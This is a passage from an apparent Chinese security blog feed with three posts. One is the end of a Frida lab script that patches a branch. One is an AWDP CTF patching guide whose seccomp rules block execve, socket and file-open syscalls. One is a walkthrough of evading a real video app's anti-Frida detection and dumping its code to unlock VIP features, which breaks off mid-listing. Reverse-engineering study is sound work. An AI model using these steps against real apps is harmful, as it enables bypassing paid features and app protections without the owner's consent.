class="keyword">var</span> orig = <span class="title class_">Instruction</span>.<span class="title function_">parse</span>(target);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;before:&quot;</span>, orig.<span class="title function_">toString</span>());</span><br><span class="line">    <span class="keyword">var</span> orig2 = <span class="title class_">Instruction</span>.<span class="title function_">parse</span>(base.<span class="title function_">add</span>(<span class="number">0x000000000001524C</span>));</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;before2:&quot;</span>, orig2.<span class="title function_">toString</span>());</span><br><span class="line"></span><br><span class="line">    <span class="title class_">Memory</span>.<span class="title function_">patchCode</span>(target, <span class="number">1</span>, <span class="keyword">function</span> (<span class="params">code</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> cw = <span class="keyword">new</span> <span class="title class_">Arm64Writer</span>(code, &#123; <span class="attr">pc</span>: target &#125;);</span><br><span class="line">        cw.<span class="title function_">putNop</span>();   <span class="comment">// 把原来的 B.NE 改成 NOP</span></span><br><span class="line">        cw.<span class="title function_">flush</span>();</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> now = <span class="title class_">Instruction</span>.<span class="title function_">parse</span>(target);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;after:&quot;</span>, now.<span class="title function_">toString</span>());</span><br><span class="line">    <span class="keyword">var</span> now2 = <span class="title class_">Instruction</span>.<span class="title function_">parse</span>(base.<span class="title function_">add</span>(<span class="number">0x000000000001524C</span>));</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;after2:&quot;</span>, now2.<span class="title function_">toString</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title function_">frida_B</span>();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Frida-学习-Frida-Labs&quot;&gt;&lt;a href=&quot;#Frida-学习-Frida-Labs&quot; class=&quot;headerlink&quot; title=&quot;Frida 学习(Frida-Labs)&quot;&gt;&lt;/a&gt;Frida 学习(Frida-Labs)&lt;/h1&gt;&lt;p&gt;</summary>
      
    
    
    
    <category term="Android" scheme="http://matriy330.github.io/categories/Android/"/>
    
    
    <category term="Android" scheme="http://matriy330.github.io/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>AWDP FIX 及妙妙小工具</title>
    <link href="http://matriy330.github.io/8e88964a/"/>
    <id>http://matriy330.github.io/8e88964a/</id>
    <published>2025-12-02T02:15:18.000Z</published>
    <updated>2025-12-02T02:15:42.187Z</updated>
    
    <content type="html"><![CDATA[<h1 id="AWDP-FIX-及妙妙小工具"><a href="#AWDP-FIX-及妙妙小工具" class="headerlink" title="AWDP FIX 及妙妙小工具"></a>AWDP FIX 及妙妙小工具</h1><p>AWDP是<strong>一种综合考核参赛团队攻击、防御技术能力、即时策略的攻防兼备比赛模式</strong>。 每个参赛队互为攻击方和防守方，充分体现比赛的实战性、实时性和对抗性，对参赛队的渗透能力和防护能力进行综合全面的考量。 AWDP一般分为两个板块，Break（自己的payload打通）和Fix（让主办方的payload打不通）。</p><h2 id="AWDP-FIX"><a href="#AWDP-FIX" class="headerlink" title="AWDP FIX"></a>AWDP FIX</h2><p>参考了一大堆博客，来不及一一致敬了 0.0</p><h3 id="修补示例"><a href="#修补示例" class="headerlink" title="修补示例"></a>修补示例</h3><p>update.sh</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">mv</span> pwn_fix /home/ctf/pwn</span><br><span class="line"><span class="built_in">chmod</span> 777 /home/ctf/pwn</span><br></pre></td></tr></table></figure><p>打包命令</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar zcvf update.tar.gz update.sh pwn_fix</span><br></pre></td></tr></table></figure><h3 id="通用脚本"><a href="#通用脚本" class="headerlink" title="通用脚本"></a>通用脚本</h3><p>如果目标目录非<code>/home/ctf/</code>可以自行修改。</p><p>update.sh</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">cp pwn /home/ctf/pwn</span><br><span class="line">chmod 777 /home/ctf/pwn</span><br></pre></td></tr></table></figure><h3 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h3><p>避免格式化字符串的形式无非两种：一种是<code>&quot;%s&quot;, str</code>，一种是用其他输出函数来输出，例如说<code>puts</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(str);</span><br><span class="line"><span class="comment">// 或者</span></span><br><span class="line"><span class="built_in">fputs</span>(str, <span class="built_in">stdout</span>);</span><br></pre></td></tr></table></figure><p>如果dyn中有puts，那是最方便的，直接从<code>printf(str)</code>执行成<code>puts(str)</code>，也就是将<code>call printf</code>修改为<code>call puts</code>。</p><p>如果dyn中没有puts，那么就需要尝试跳转出去在一个没有使用的可写段去写<code>printf(&quot;%s&quot;, str)</code>，我们跳转的位置是从上一个函数执行结束到当前格式化字符串漏洞的<code>call printf</code>，也就是原本参数修改到执行函数的位置都是自定义的，并不是只有<code>call printf</code>才能覆写。</p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511130837825.png" alt="image-20251113083718751"></p><h3 id="堆题的一些通用修复"><a href="#堆题的一些通用修复" class="headerlink" title="堆题的一些通用修复"></a>堆题的一些通用修复</h3><p>堆题高度依赖于 free 函数，如果说 malloc 等函数的不正确使用是造成漏洞的主要原因（比如说溢出就属于长度没控制好），那 free 就是触发漏洞的关键</p><p><strong>nop</strong> 掉free</p><p><strong>free后未置空</strong></p><p>一般来说后面有错误处理的话是最好的，一般checker不会管错误处理，所以直接在其他函数的错误处理上写<code>mov [rbp+ptr], 0</code>就可以了，例如说前面写了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movrax, [rbp+ptr]</span><br><span class="line">movrdi, rax</span><br><span class="line">callfree</span><br></pre></td></tr></table></figure><p>那么<code>[rbp+ptr]</code>就是需要置空的地址，而非rdi或rax寄存器。所以<code>mov [rbp+ptr], 0</code>就是有效的。</p><h3 id="溢出"><a href="#溢出" class="headerlink" title="溢出"></a>溢出</h3><p>我们需要注意多种溢出方式，一种是输入溢出，一种是复制溢出。</p><p>输入溢出就是通过输入如<code>scanf(&quot;%s&quot;, buf)</code>、<code>read(0, buf, a_large_size)</code>等形式发生的；复制溢出就是通过<code>memcpy(buf1, buf2, a_large_size)</code>、<code>for i to a_large_size: buf1[i] = buf2[i]</code>等形式发生的。</p><p>memcpy、read这种函数本身存在控制字长的就很简单，可以先试试直接size_t传个0给不给过，然后再看缓冲区长度再去试。</p><p>用scanf的话大概率改三参数函数是不够的，一般还是要跳出去再回来，rdi rsi rdx。跳出去的话可以改为read，但其实还有方法，比如说从格式化字符串上下手，找个地方写<code>&quot;%12s&quot;</code></p><h2 id="妙妙小工具"><a href="#妙妙小工具" class="headerlink" title="妙妙小工具"></a>妙妙小工具</h2><h3 id="pwnpasi"><a href="#pwnpasi" class="headerlink" title="pwnpasi"></a>pwnpasi</h3><p><a href="https://github.com/heimao-box/pwnpasi">heimao-box&#x2F;pwnpasi：该工具是一个自动化的 PWN 利用框架，专为 CTF 竞赛和二进制漏洞利用而设计。它集成了堆栈溢出和格式字符串攻击等各种利用技术，支持 32 位和 64 位程序的自动分析和利用。</a></p><p><strong>签到题杀手</strong></p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511122057608.png" alt="image-20251112205713536"></p><h3 id="evilPatcher"><a href="#evilPatcher" class="headerlink" title="evilPatcher"></a>evilPatcher</h3><p><a href="https://github.com/TTY-flag/evilPatcher">TTY-flag&#x2F;evilPatcher</a></p><p><a href="https://hello-ctf.com/hc-awd/awd_pwn.exp/#evilpatcher">【PWN】AWD 技巧 - Hello CTF</a></p><p>能给程序禁用一些系统调用来实现通防</p><blockquote><p> 这种方法对于 Docker 环境不适用，因为需要 Docker 开启 <strong>CAP_SYS_PTRACE</strong> 权限，但是这玩意会导致 Docker 逃逸，不过当然了，如果是纯黑盒的话，想逃还是很难的，360 等平台使用的似乎就是 Docker 的环境，而永信至诚的平台似乎是 VM 环境，这种方法可以使用</p></blockquote><p>sandbox里有几个规则</p><p><strong>mini_sandbox.asm</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">A = sys_number</span><br><span class="line">A == execve ? dead : next</span><br><span class="line">return ALLOW</span><br><span class="line">dead:</span><br><span class="line">return KILL</span><br></pre></td></tr></table></figure><p>阻止execve，允许除 execve 外的一切系统调用。</p><p>适合程序大多数功能都要保留，只是想简单防止被直接开 shell。</p><p><strong>sandbox1.asm</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">A = sys_number</span><br><span class="line">A &gt;= 0x40000000 ? dead : next</span><br><span class="line">A == execve ? dead : next</span><br><span class="line">A == open ? dead : next</span><br><span class="line">return ALLOW</span><br><span class="line">dead:</span><br><span class="line">return KILL</span><br></pre></td></tr></table></figure><p>阻止高位 syscall + execve+ open。</p><p>允许其它低号 syscalls（包括 read&#x2F;write&#x2F;socket 等）。</p><p>在防止 getshell 的基础上再禁止直接打开文件（<code>open</code>），提高读取本地敏感文件（如 <code>/flag</code>）的难度。</p><blockquote><p>很多程序正常运行可能需要 <code>open</code>（配置文件&#x2F;日志&#x2F;库加载），因此这个规则可能会破坏合法功能 —— 必须先测试并白名单必须的文件访问方式（或允许 <code>openat</code> 等）。</p></blockquote><p><strong>sandbox2.asm</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">A = sys_number</span><br><span class="line">A &gt;= 0x40000000 ? dead : next</span><br><span class="line">A == open ? dead : next</span><br><span class="line">A == mmap ? dead : next</span><br><span class="line">A == ptrace ? dead : next</span><br><span class="line">A == openat ? dead : next</span><br><span class="line">A == open_by_handle_at ? dead : next</span><br><span class="line">return ALLOW</span><br><span class="line">dead:</span><br><span class="line">return KILL</span><br></pre></td></tr></table></figure><p>阻止高位 syscall + <code>open</code>, <code>mmap</code>, <code>ptrace</code>, <code>openat</code>, open_by_handle_at。</p><p><strong>用途&#x2F;效果：</strong></p><ul><li>禁 <code>open</code>&#x2F;<code>openat</code>&#x2F;<code>open_by_handle_at</code>：禁止各种文件打开接口，防止读取文件（flag）。</li><li>禁 <code>mmap</code>：阻断常见的内存映射操作（有些 shellcode&#x2F;ROP 会用 <code>mmap</code> 映射可执行页或构造 RWX 段）；这会显著减少某类内存注入或动态映射攻击的成功率。</li><li>禁 <code>ptrace</code>：防止调试&#x2F;attach（阻止某些利用或调试行为）。</li></ul><blockquote><p>mmap 很常见（动态加载、malloc 实现可能内部用），有较大破坏性；使用前必须确认程序不依赖 <code>mmap</code>（或允许一小部分必要的 mmap 行为）。</p></blockquote><p><strong>sandbox3.asm</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">A = sys_number</span><br><span class="line">A &gt;= 0x40000000 ? dead : next</span><br><span class="line">A == socket ? dead : next</span><br><span class="line">A == connect ? dead : next</span><br><span class="line">A == bind ? dead : next</span><br><span class="line">A == listen ? dead : next</span><br><span class="line">A == clone ? dead : next</span><br><span class="line">A == execve ? dead : next</span><br><span class="line">return ALLOW</span><br><span class="line">dead:</span><br><span class="line">return KILL</span><br></pre></td></tr></table></figure><p>高位 syscall + <code>socket</code>, <code>connect</code>, <code>bind</code>, <code>listen</code>, <code>clone</code>, <code>execve</code>。</p><p>允许其它低号 syscalls (包括 <code>open</code>, <code>read</code>, <code>write</code>, <code>mmap</code> 等)。</p><p>禁止网络操作与进程克隆，适合把服务限定为仅能做本地工作、不能建立网络连接或fork线程</p><h2 id="最终启示-华为杯"><a href="#最终启示-华为杯" class="headerlink" title="最终启示 [华为杯]"></a>最终启示 [华为杯]</h2><p>啥工具都没招</p><p>快速修复启示就是</p><p>线下断网环境一定要拿个显卡部署个大模型30b以上的，都能秒</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;AWDP-FIX-及妙妙小工具&quot;&gt;&lt;a href=&quot;#AWDP-FIX-及妙妙小工具&quot; class=&quot;headerlink&quot; title=&quot;AWDP FIX 及妙妙小工具&quot;&gt;&lt;/a&gt;AWDP FIX 及妙妙小工具&lt;/h1&gt;&lt;p&gt;AWDP是&lt;strong&gt;一种综合考</summary>
      
    
    
    
    <category term="CTF wp" scheme="http://matriy330.github.io/categories/CTF-wp/"/>
    
    
    <category term="wp" scheme="http://matriy330.github.io/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>Android实战-逆向某li某li视频APP</title>
    <link href="http://matriy330.github.io/728483b1/"/>
    <id>http://matriy330.github.io/728483b1/</id>
    <published>2025-11-26T03:45:37.000Z</published>
    <updated>2026-01-20T11:40:58.335Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Android实战-逆向某li某li视频APP"><a href="#Android实战-逆向某li某li视频APP" class="headerlink" title="Android实战-逆向某li某li视频APP"></a>Android实战-逆向某li某li视频APP</h1><p>当然不是bilibili，是某不良视频APP,没想到不良软件都能上梆梆加固企业版了，因此xposed模块编写失败，被检测了，进修后再来看看吧</p><h2 id="Frida-hook分析"><a href="#Frida-hook分析" class="headerlink" title="Frida hook分析"></a>Frida hook分析</h2><p>MT看了下是梆梆加固企业版(不知道真假)，先看看能不能一把梭</p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511191144575.png" alt="image-20251119114414291"></p><p>frida-dexdump出现了点问题</p><blockquote><p><strong>JavaScript agent（Frida 注入脚本）在执行过程中被目标进程销毁&#x2F;结束，导致 RPC 调用失败。</strong></p></blockquote><p>为什么RPC会失败?</p><p>原因是：</p><blockquote><p><strong>JS Agent 已经死亡，但 Python 还在尝试 RPC 调用</strong>。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">searchdex → RPC 调用</span><br><span class="line">     ↓</span><br><span class="line">Frida JS agent 被杀死（反调试 / 崩溃）</span><br><span class="line">     ↓</span><br><span class="line">script has been destroyed</span><br></pre></td></tr></table></figure><p>RPC &#x3D; 电脑端调用 Frida 注入手机里的 JS 函数。</p><p>JS 崩溃 → RPC 失败 → InvalidOperationError。</p><p>在安卓中，应用大多运行在<strong>不同的进程中</strong>，彼此不能直接访问对方的内存。于是 Android 设计了 <strong>Binder IPC（进程间通信）</strong>，它使用 <strong>RPC 模型</strong>：</p><blockquote><p>就像你调用一个函数，但这个函数实际上在另一个进程里执行。</p></blockquote><p>可能导致rpc失败的点很多</p><ul><li><code>ptrace</code> 反调试</li><li>native 层 <code>anti-frida</code></li><li>Java 层 <code>isDebuggerConnected</code></li><li>hook 监控</li><li>detect Frida server 端口</li><li>detect &#x2F;data目录中 frida 名称</li><li>判断 frida-gadget 特征内存</li><li>主动 kill 注入线程</li></ul><p>导致 Frida agent 被瞬间 kill → <strong>script 被销毁</strong></p><p>经过测试，不启动frida时是可以正常启动的</p><p>问题可能就是frida-server被识别</p><p><a href="https://56.al/">56.al</a></p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511191148590.png" alt="image-20251119114827518"></p><p>网站试了下，梭出来了点信息</p><p>jadx查看了下，是广告vip和一些简单的视频vip</p><p>而不包含userVip</p><p>要凭借这些信息绕过也行，但最根本的还得凭借user的一些注入和hook</p><p>用了<a href="https://github.com/hzzheyang/strongR-frida-android/releases?page=7">Releases · hzzheyang&#x2F;strongR-frida-android</a></p><p>还是被kill掉了</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="comment">//枚举当前加载的模块</span></span><br><span class="line">    <span class="keyword">var</span> process_Obj_Module_Arr = <span class="title class_">Process</span>.<span class="title function_">enumerateModules</span>();</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; process_Obj_Module_Arr.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    <span class="comment">//包含&quot;lib&quot;字符串的</span></span><br><span class="line">    <span class="keyword">if</span>(process_Obj_Module_Arr[i].<span class="property">path</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;lib&quot;</span>)!=-<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;模块名称:&quot;</span>,process_Obj_Module_Arr[i].<span class="property">name</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;模块地址:&quot;</span>,process_Obj_Module_Arr[i].<span class="property">base</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;大小:&quot;</span>,process_Obj_Module_Arr[i].<span class="property">size</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;文件系统路径&quot;</span>,process_Obj_Module_Arr[i].<span class="property">path</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> dlopen_interceptor = <span class="title function_">hook_dlopen</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">hook_dlopen</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(<span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="literal">null</span>, <span class="string">&quot;android_dlopen_ext&quot;</span>),</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">                    <span class="variable language_">this</span>.<span class="property">fileName</span> = args[<span class="number">0</span>].<span class="title function_">readCString</span>()</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`dlopen onEnter: <span class="subst">$&#123;<span class="variable language_">this</span>.fileName&#125;</span>`</span>)</span><br><span class="line">                &#125;, <span class="attr">onLeave</span>: <span class="keyword">function</span>(<span class="params">retval</span>)&#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`dlopen onLeave fileName: <span class="subst">$&#123;<span class="variable language_">this</span>.fileName&#125;</span>`</span>)</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hook_dlopen</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(<span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="literal">null</span>, <span class="string">&quot;android_dlopen_ext&quot;</span>),</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">                <span class="keyword">var</span> pathptr = args[<span class="number">0</span>];</span><br><span class="line">                <span class="keyword">if</span> (pathptr !== <span class="literal">undefined</span> &amp;&amp; pathptr != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">var</span> path = <span class="title function_">ptr</span>(pathptr).<span class="title function_">readCString</span>();</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;load &quot;</span> + path);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title function_">hook_dlopen</span>();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>hook<code>android_dlopen_ext</code>&gt;查看so文件的加载流程</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">dlopen onEnter: libmonochrome_64.so</span><br><span class="line">dlopen onLeave fileName: libmonochrome_64.so</span><br><span class="line">dlopen onEnter: /product/app/TrichromeLibrary64/TrichromeLibrary64.apk!/lib/arm64-v8a/libmonochrome_64.so</span><br><span class="line">dlopen onLeave fileName: /product/app/TrichromeLibrary64/TrichromeLibrary64.apk!/lib/arm64-v8a/libmonochrome_64.so</span><br><span class="line">dlopen onEnter: /system/lib64/libwebviewchromium_plat_support.so</span><br><span class="line">dlopen onLeave fileName: /system/lib64/libwebviewchromium_plat_support.so</span><br></pre></td></tr></table></figure><p>libwebviewchromium_plat_support.so</p><p>这个里面可能放反调试的东西?</p><p>但是之前用MT看的时候是某梆加固企业版怪问题是用查壳工具并没有发现特征</p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511192115889.png" alt="image-20251119211509768"></p><p>越看越奇怪</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./hs -l 0.0.0.0:9999</span><br><span class="line">adb forward tcp:9999 tcp:9999(需要另外开一个终端),前面的是电脑端口</span><br><span class="line">frida -H 127.0.0.1:9999 -f xxx -l r0tracer.js</span><br></pre></td></tr></table></figure><p>直接换了个端口就不闪退了</p><p>frida默认端口号是20742</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida-dexdump -H 127.0.0.1:9999 -f com.ctf -o  E:\Desktop\dump\</span><br></pre></td></tr></table></figure><p>成功运行</p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511192237861.png" alt="image-20251119223705732"></p><p>有几处错误地方很正常</p><p>看来那个某梆企业版感觉是吓唬人的…</p><p>抓下包</p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511202112371.png" alt="image-20251120211208201"></p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511202146782.png" alt="image-20251120214618691"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@o(&quot;v1/user/info&quot;)</span></span><br><span class="line">pl.d&lt;vo.o&lt;String&gt;&gt; g(<span class="meta">@zo</span>.a w wVar);</span><br></pre></td></tr></table></figure><p>@o 很可能是 Retrofit 的 @POST</p><p>@zo.a 很可能是 Retrofit 的 @Body</p><p>通过抓包字段viptril找到了ResponseUserInfo</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span 